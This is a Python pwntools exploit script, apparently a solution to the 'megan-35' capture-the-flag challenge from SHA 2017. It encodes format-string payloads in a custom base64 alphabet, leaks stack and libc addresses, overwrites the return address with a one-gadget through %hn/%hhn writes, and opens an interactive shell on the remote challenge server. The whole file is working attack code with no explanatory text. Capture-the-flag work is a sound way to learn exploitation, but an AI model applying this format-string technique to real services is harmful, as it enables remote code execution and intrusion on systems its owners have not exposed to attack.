import string
from pwn import *
context(arch="i386", os="linux")

base64  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
megan35 = "3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF"
t_megan35 = string.maketrans(base64, megan35)

def encode(payload):
	payload = payload.encode("base64")
	return payload.translate(t_megan35).replace("=","@")

DEBUG = False
if len(sys.argv) == 2:
	DEBUG = True

target = "./megan-35"
env = {"LD_PRELOAD": "/home/tbkim/ctf/pwnable/0018_2017_SHA_Megan35/libc.so.6"}
server = "megan35.stillhackinganyway.nl"
port = 3535
p = None

payload = encode("%95$08x")
if DEBUG:
	p = process(target, env=env)
else:
	p = remote(server, port)

print p.recv()
p.sendline(payload)
data = p.recv()
leak = int(data[0:8], 16)
ret = leak + 0x54
buf_addr = leak - 0x1dc
print "RET    : {}".format(hex(ret))
print "BUF    : {}".format(hex(buf_addr))

p.close()

payload = encode("%2$08x")

if DEBUG:
	p = process(target, env=env)
else:
	p = remote(server, port)

print p.recv()
p.sendline(payload)
data = p.recv()
libc_base = int(data[0:8], 16) - 0x1b05a0
one_shot = libc_base + 0x11dc1f
print "LIB      : {}".format(hex(libc_base))
print "ONE-SHOT : {}".format(hex(one_shot))
p.close()

# 7 = &buf_addr
payload = "A"*8         # 7-8 : not used
payload += p32(ret)     # 9
payload += p32(ret+2)   # 10
payload += "B"*8		# 11-12 : not used

word_9 = (one_shot & 0x0000ffff) - 0x12
payload2 = "%{}c%9$hn".format(word_9)
byte_10 = ((one_shot & 0x00ff0000) >> 16) - 0x12

if (word_9 & 0xff) > byte_10:
	byte_10 = 0x100 - (word_9 & 0xff) + byte_10
else:
	byte_10 = byte_10 - (word_9 & 0xff)
payload2 += "%{}c%10$hhn".format(byte_10)

if DEBUG:
	p = process(target, env=env)
else:
	p = remote(server, port)
print p.recvline()
p.sendline(payload + encode(payload2))
p.interactive()
